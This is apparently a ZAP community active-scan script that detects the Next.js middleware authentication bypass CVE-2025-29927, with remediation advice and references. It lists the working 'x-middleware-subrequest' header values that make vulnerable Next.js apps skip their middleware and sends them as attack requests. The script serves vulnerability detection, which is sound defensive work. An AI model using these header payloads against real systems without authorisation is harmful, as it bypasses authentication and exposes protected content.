/**
 * CVE-2025-29927 - Next.js Middleware Authentication Bypass
 *
 * Next.js uses the "x-middleware-subrequest" request header to identify its own
 * internal subrequests and, in vulnerable versions, trusts that header without
 * verifying that the request really originated internally. A client which sends
 * the header can therefore have the application's middleware skipped entirely,
 * bypassing any authentication, authorization or redirect logic implemented
 * there.
 *
 * This active scan rule sends a baseline request to each node and only carries
 * on when that baseline looks gated by middleware (a redirect, or a 401/403
 * response). It then repeats the request with each of the known
 * "x-middleware-subrequest" values and raises an alert when the middleware gate
 * is gone and the protected content is served instead of a login page.
 *
 * Active scripts are initially disabled, right click the script in the Scripts
 * tree and select "Enable" to use it.
 *
 * Author: Abdullah Shahid (@comradezephyr)
 */

var Alert = Java.type("org.parosproxy.paros.core.scanner.Alert");
var ScanRuleMetadata = Java.type(
  "org.zaproxy.addon.commonlib.scanrules.ScanRuleMetadata"
);
var CommonAlertTag = Java.type("org.zaproxy.addon.commonlib.CommonAlertTag");

// Change to true for more logs.
var LOG_DEBUG_MESSAGES = false;

var SUBREQUEST_HEADER = "x-middleware-subrequest";

// Values which make Next.js treat a request as an internal middleware
// subrequest, covering Next.js 12.2 through 15.x. Next.js 13.2 and later only
// skips the middleware once the middleware module name appears five times
// (MAX_RECURSION_DEPTH), earlier versions accept a single occurrence, and the
// "src/" variants apply when the middleware is under a src/ directory.
var SUBREQUEST_VALUES = [
  "middleware:middleware:middleware:middleware:middleware",
  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
  "middleware",
  "src/middleware",
  "pages/_middleware",
];

// Status codes which indicate the request was gated by the middleware.
var GATE_STATUS_CODES = [301, 302, 303, 307, 308, 401, 403];

// Response headers which are characteristic of Next.js. They are only used as a
// hint, giving a more confident alert, as they are easy to hide, so the scan
// continues when none of them is present.
var NEXTJS_HEADERS = [
  "x-powered-by",
  "x-nextjs-cache",
  "x-nextjs-prerender",
  "x-nextjs-date",
];

// Markers which indicate that a response is a login page.
var LOGIN_MARKERS = ["login", "signin", "sign in", "log in"];

// URLs which have already been tested, used to avoid testing a node twice.
var testedUrls = {};

function getMetadata() {
  return ScanRuleMetadata.fromYaml(`
id: 100046
name: CVE-2025-29927 - Next.js Middleware Authentication Bypass
description: >
  Next.js uses the x-middleware-subrequest request header to identify its own
  internal subrequests and, in vulnerable versions, trusts the header without
  verifying that the request originated internally. An attacker can therefore
  send the header with a request to a protected page or API route and have the
  application middleware skipped entirely, bypassing any authentication,
  authorization or redirect logic implemented there and gaining access to
  protected content without credentials.
solution: >
  Upgrade Next.js to a fixed version (12.3.5, 13.5.9, 14.2.25, 15.2.3 or later).
  Applications deployed on Vercel, Netlify or Cloudflare are protected
  automatically. If an immediate upgrade is not possible, do not allow requests
  which contain the x-middleware-subrequest header to reach the Next.js
  application, for example by blocking or stripping the header at the reverse
  proxy, load balancer or WAF. Note that middleware should not be the only
  authorization check.
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
  - https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw
  - https://zhero-web-sec.github.io/research-and-things/nextjs-and-cve-2025-29927-a-new-vulnerability
category: server
risk: high
confidence: medium
cweId: 287  # CWE-287: Improper Authentication
wascId: 1  # WASC-1: Insufficient Authentication
alertTags:
  ${CommonAlertTag.OWASP_2021_A01_BROKEN_AC.getTag()}: ${CommonAlertTag.OWASP_2021_A01_BROKEN_AC.getValue()}
  ${CommonAlertTag.OWASP_2017_A02_BROKEN_AUTH.getTag()}: ${CommonAlertTag.OWASP_2017_A02_BROKEN_AUTH.getValue()}
  CVE-2025-29927: https://nvd.nist.gov/vuln/detail/CVE-2025-29927
status: alpha
codeLink: https://github.com/zaproxy/community-scripts/blob/main/active/CVE202529927.js
helpLink: https://www.zaproxy.org/docs/desktop/addons/community-scripts/
`);
}

/**
 * Scans a "node", i.e. an individual entry in the Sites Tree.
 *
 * @param as - the ActiveScan parent object, an ActiveScriptHelper.
 * @param msg - the HTTP Message being scanned, an HttpMessage object.
 */
function scanNode(as, msg) {
  var url = msg.getRequestHeader().getURI().toString();

  // This is a header based attack, only GET requests are tested.
  if (msg.getRequestHeader().getMethod() !== "GET") {
    return;
  }

  if (testedUrls[url] === true) {
    return;
  }
  testedUrls[url] = true;

  if (as.isStop()) {
    return;
  }

  // Send a baseline request, without following redirects so that a middleware
  // redirect to a login page is visible.
  var baselineMsg = msg.cloneRequest();
  as.sendAndReceive(baselineMsg, false, false);

  var baseline = {
    status: baselineMsg.getResponseHeader().getStatusCode(),
    body: baselineMsg.getResponseBody().toString(),
    location: baselineMsg.getResponseHeader().getHeader("Location"),
    nextjs: isNextJs(baselineMsg),
  };

  if (GATE_STATUS_CODES.indexOf(baseline.status) === -1) {
    debug(
      "Skipped url=" +
        url +
        ", the baseline response (" +
        baseline.status +
        ") is not gated by middleware"
    );
    return;
  }

  if (!baseline.nextjs) {
    // Not a reason to stop, the Next.js headers are easy to hide, but it makes
    // the alert less certain.
    debug("Url=" + url + " has no obvious Next.js fingerprints");
  }

  for (var i = 0; i < SUBREQUEST_VALUES.length; i++) {
    if (as.isStop()) {
      return;
    }

    var payload = SUBREQUEST_VALUES[i];
    var attackMsg = msg.cloneRequest();
    attackMsg.getRequestHeader().setHeader(SUBREQUEST_HEADER, payload);
    as.sendAndReceive(attackMsg, false, false);

    var attackStatus = attackMsg.getResponseHeader().getStatusCode();
    if (attackStatus >= 500) {
      continue;
    }

    if (isBypassConfirmed(baseline, attackMsg, attackStatus)) {
      debug(
        "Middleware bypassed for url=" +
          url +
          " using '" +
          SUBREQUEST_HEADER +
          ": " +
          payload +
          "'"
      );
      raiseAlert(as, attackMsg, payload, baseline, attackStatus);
      // No need to try the remaining header values.
      return;
    }
  }

  debug("Url=" + url + " does not appear to be vulnerable");
}

/**
 * Determines whether the middleware gate seen in the baseline response is gone
 * when the crafted header is sent.
 *
 * @param baseline - the details recorded for the baseline response.
 * @param attackMsg - the message sent with the crafted header.
 * @param attackStatus - the status code of the attack response.
 */
function isBypassConfirmed(baseline, attackMsg, attackStatus) {
  // The resource which the middleware previously rejected or redirected to a
  // login page must now be served.
  if (attackStatus !== 200) {
    return false;
  }

  var attackBody = attackMsg.getResponseBody().toString();

  // The response must actually have changed, otherwise an application which
  // always returns 200 (for example one which serves a SPA shell for everything)
  // could look vulnerable.
  if (attackBody === baseline.body) {
    return false;
  }

  // A 200 response which still contains the login page means the middleware was
  // not bypassed, for example because the application is behind a SSO gateway.
  if (looksLikeLoginPage(attackBody)) {
    debug("The bypass response still looks like a login page");
    return false;
  }

  // A redirect to a login page which is replaced by the protected content is the
  // clearest indication that the middleware was skipped.
  if (baseline.location !== null && baseline.location.length > 0) {
    return true;
  }

  // For a 401 or 403 response which is now served as a 200 response, require the
  // content to differ significantly from the page which rejected the request.
  return differsByMoreThan(attackBody.length, baseline.body.length, 10);
}

/**
 * Checks whether the given response body looks like a login page.
 */
function looksLikeLoginPage(body) {
  // Only the start of the body is checked, login pages put their form near the
  // top and large responses are expensive to search.
  var sample = body.substring(0, 2000).toLowerCase();
  for (var i = 0; i < LOGIN_MARKERS.length; i++) {
    if (sample.indexOf(LOGIN_MARKERS[i]) !== -1) {
      return true;
    }
  }
  return false;
}

/**
 * Checks whether two body lengths differ by more than the given percentage.
 */
function differsByMoreThan(length, baselineLength, percentage) {
  if (baselineLength === 0) {
    return length > 0;
  }
  var difference = Math.abs(length - baselineLength);
  return (difference / baselineLength) * 100 > percentage;
}

/**
 * Checks the response for headers which are characteristic of Next.js.
 */
function isNextJs(msg) {
  for (var i = 0; i < NEXTJS_HEADERS.length; i++) {
    var value = msg.getResponseHeader().getHeader(NEXTJS_HEADERS[i]);
    if (value !== null && value.length > 0) {
      return true;
    }
  }
  return false;
}

/**
 * Raises an alert for a confirmed middleware bypass.
 *
 * @param as - the ActiveScan parent object.
 * @param attackMsg - the message sent with the crafted header.
 * @param payload - the x-middleware-subrequest value which bypassed the
 *     middleware.
 * @param baseline - the details recorded for the baseline response.
 * @param attackStatus - the status code of the attack response.
 */
function raiseAlert(as, attackMsg, payload, baseline, attackStatus) {
  var otherInfo =
    "Baseline response: HTTP " +
    baseline.status +
    (baseline.location !== null && baseline.location.length > 0
      ? " (Location: " + baseline.location + ")"
      : "") +
    ", body length " +
    baseline.body.length +
    " bytes.\n" +
    "Response with the crafted header: HTTP " +
    attackStatus +
    ", body length " +
    attackMsg.getResponseBody().toString().length +
    " bytes.\n" +
    "Next.js response headers detected: " +
    (baseline.nextjs ? "yes" : "no") +
    ".\n" +
    "Only versions of Next.js prior to 12.3.5, 13.5.9, 14.2.25 and " +
    "15.2.3 are vulnerable.";

  as.newAlert()
    .setConfidence(
      baseline.nextjs ? Alert.CONFIDENCE_MEDIUM : Alert.CONFIDENCE_LOW
    )
    .setEvidence(SUBREQUEST_HEADER + ": " + payload)
    .setAttack(payload)
    .setOtherInfo(otherInfo)
    .setMessage(attackMsg)
    .raise();
}

/**
 * Scans a specific parameter in an HTTP message. This rule only attacks a
 * header, so there is nothing to do here.
 *
 * @param as - the ActiveScan parent object, an ActiveScriptHelper.
 * @param msg - the HTTP Message being scanned, an HttpMessage object.
 * @param {string} param - the name of the parameter being manipulated.
 * @param {string} value - the original parameter value.
 */
function scan(as, msg, param, value) {
  return;
}

function debug(message) {
  if (LOG_DEBUG_MESSAGES) {
    print("CVE-2025-29927: " + message);
  }
}
